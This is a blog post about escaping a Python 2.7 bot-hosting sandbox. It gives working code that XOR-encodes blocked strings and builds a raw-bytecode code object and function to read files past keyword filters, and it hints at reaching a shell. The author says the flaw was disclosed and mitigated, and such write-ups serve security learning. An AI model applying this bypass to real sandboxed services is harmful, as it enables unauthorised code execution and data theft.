@@ -1,0 +1,135 @@
+<html><body><div><div class="post-body entry-content" id="post-body-7923080870056521360" itemprop="articleBody">
+<h2>
+</h2><p>
+Awhile ago, I stumbled upon a service that let you write python-bots to interact with a number of external services. The basic idea was that you only had to worry about your logic, and they would provide a wrapper around API's and take care of hosting the bot for a monthly fee.
+</p><p>
+Python "Jail" or sandbox escapes are fairly common in CTFs, and I knew that there are all sorts of "magical" ways of doing things in python, so I decided to poke around a bit. Sure enough, I found a way of circumventing the sandbox and getting (kind of) arbitrary python to run. I've since talked to the founder about this, and they've taken steps to mitigate the damage one could do, so I thought I'd talk about some real world python-chaos :).[Specifically, virtualization is used to protect the host system]. With the level of access I had, I'm fairly sure it was possible to get a shell, and from there, who knows...
+</p><p>
+The remainder of this post will describe the process of breaking out of the sandbox they set up. Everything was written/tested on python 2.7.6. 
+</p><p>
+At face value, the service was stripped of most dangerous components fairly well:
+</p><ul>
+<li>"Fun" modules could not be imported (sys, os, etc)</li>
+<li>"Fun" keywords/functions got your script thrown out (exec, open(), read(), compile(), etc)</li>
+<li>"Fun" attributes, nope! (myfunc.func_code)</li>
+<li> Fun stuff couldn't even be in static strings! (Annoying, but not really that important). </li>
+</ul><p>
+The last point was the easiest to get around. Just send up a list of xor'd values, and dynamically build whatever string you need. 
+
+
+</p><pre class="prettyprint linenums">str1 = [30, 30, 35, 52, 40, 45, 53, 40, 47, 50, 30, 30]
+for i in range(0,len(str1)):
+        str1[i] = chr(str1[i] ^ 0x41)
+str1 = ''.join(str1)
+</pre><p>
+That gets us around most of the basic string-matching, but it still doesn't let us do anything interesting. The rest of the exploit relies on code objects. 
+</p><a href="http://late.am/post/2012/03/26/exploring-python-code-objects"> If you're not familiar with them, this is a great overview</a>
+
+<p>
+So, normally, python allows you to access all the guts of functions. A Function is basically a wrapper for a code-object, and (as the name implies) you can access and modify these objects as you like. The python interpreter acts as a sort of VM, fetching and executing bytecode found inside code-objects. Python bytecode is assembly-ish. </p><a href="https://akaptur.github.io/blog/2013/08/14/python-bytecode-fun-with-dis/"> You can take a look here if you want to play around </a>
+
+<p>
+At first, its tempting to just try directly modifying a dummy function's bytecode. However, that requires accessing the "func_code" member, which is explicitly blocked. Additionally, just modifying bytecode wouldn't be enough.  Fortunately, it /was/ possible to get access to a code-object. 
+
+
+</p><pre class="prettyprint">cdbj = type(myfunc.__code__)</pre>
+<p>
+Now that we have a dummy code object, we can proceed to fill it in, and slide it into an empty function. The question at this point, is what do we fill it in with?
+
+</p><pre class="prettyprint">&gt;&gt;&gt; dir(f.__code__)
+['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', 
+'__getattribute__','__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__'
+, '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', 
+'__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 
+'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 
+'co_stacksize', 'co_varnames']
+</pre>
+<p>
+So, that looks a bit intimidating, but really, we're only interested in a few of these. Specifically, I used
+</p><ul>
+<li>co_code: <i>string of raw compiled bytecode</i></li>
+<li>co_consts:<i> tuple of constants used
+in the bytecode </i></li>
+<li>co_names:<i> tuple of names of local
+variables </i></li>
+</ul>
+ <a href="https://docs.python.org/2/library/inspect.html"> Most of the others are documented here if you want to take a look. </a><p>
+I had an info-leak that gave me the path of an interesting file, so I wanted my bytecode to basically do: open(&lt;filename).read().
+</p><p>
+You can inspect bytecode in a user-friendly-ish way by using the dis module. This makes it easier to understand the fields we'll be filling in. 
+
+</p><pre class="prettyprint">import dis
+def read():
+        return open("./poc.py",'r').read()
+
+dis.dis(read.__code__)
+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
+ 28           0 LOAD_GLOBAL              0 (open)
+              3 LOAD_CONST               1 ('./poc.py')
+              6 LOAD_CONST               2 ('r')
+              9 CALL_FUNCTION            2
+             12 LOAD_ATTR                1 (read)
+             15 CALL_FUNCTION            0
+             18 RETURN_VALUE        
+</pre><p>
+Now, to actually access the bytecode that results in this:
+
+
+</p><pre class="prettyprint">bytecode = read.__code__.co_code
+print bytecode.encode('hex')
+&gt;&gt;&gt; 7400006401006402008302006a010083000053
+</pre><p>
+This gives us all the necessary pieces to create our code object. We can slide in our values like this:
+
+
+</p><pre class="prettyprint linenums">code = type(myfunc.__code__)        #Get a Code Object
+bytecode = "7400006401006402008302006a010083000053".decode('hex')   #Get our bytecode
+filename = "./poc.py"             #Set our filename
+consts = (None,filename,'r')      #Set up our constants
+names = ('open','read')           #Set up our names
+#Slide our values into the code object.
+codeobj = code(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '&lt;module&gt;', 1, '', (), ()) 
+</pre><p>
+Great! Now we've created a code object with our desired functionality, without using anything that would trigger alerts. The only thing left to do is finding a way to execute it! Thankfully, functions in python are quite malleable. </p><a href="https://docs.python.org/2.7/reference/datamodel.html#types"> You can read about all their attributes here.</a>
+<p>
+First, we start off with an empty, "dummy" function, and obtain a variable of type "function" that we can modify. 
+
+
+</p><pre class="prettyprint">def f():
+    pass
+function = type(f)
+</pre><p>
+Turns out there's one more major thing we need to do before we can slide in our code object. Python functions have a __globals__ attribute.
+
+This is described in the python documentation as:  
+</p><blockquote class="tr_bq">
+<table border="1" class="docutils"><tbody valign="top">
+<tr class="row-odd"><td><tt class="xref py py-attr docutils literal"><span class="pre"/></tt><br/></td>
+<td>A reference to the dictionary
+that holds the function’s
+global variables — the
+global namespace of the
+module in which the function
+was defined.</td></tr>
+</tbody></table>
+</blockquote><p>
+Since the only thing we're worried about in our function is using the open() and read() built-in calls, we can create this dictionary easily enough. 
+
+</p><pre class="prettyprint">import __builtin__
+mydict = {}
+mydict["__builtins__"] = __builtin__
+</pre><p>
+At this point, the only thing left to do is put all the pieces together. Using the "function" variable we created before:
+
+</p><pre class="prettyprint">return function(codeobj, mydict, None, None, None)
+</pre>
+<p>
+So, in conclusion, we've created a code object and devised a way of executing it. Obviously, it is possible to block a few more keywords and stop this attack from being possible, but it highlights the difficulty of getting this sort of thing right.
+</p><p>
+For some ideas of taking this to the next level, </p><a href="http://mslc.ctf.su/wp/plaidctf-2014-__nightmares__-writeup/"> take a look at this CTF writeup </a><p> that discusses using a read/write primitive to obtain shell-level remote code execution on the host system. Certainly something to keep in mind.
+
+</p><p>
+Actually getting this to execute on similar production environments will probably require a bit more obfuscation/creativity. </p><a href="https://gist.github.com/pbiernat/c1a911a595f0844ee21f"> However, I've put together an example script that ties together all the steps explained here into a simple package that you should be able to execute and play with locally. </a><p> Enjoy! :) 
+</p><p/>
+</div>
+</div></body></html>
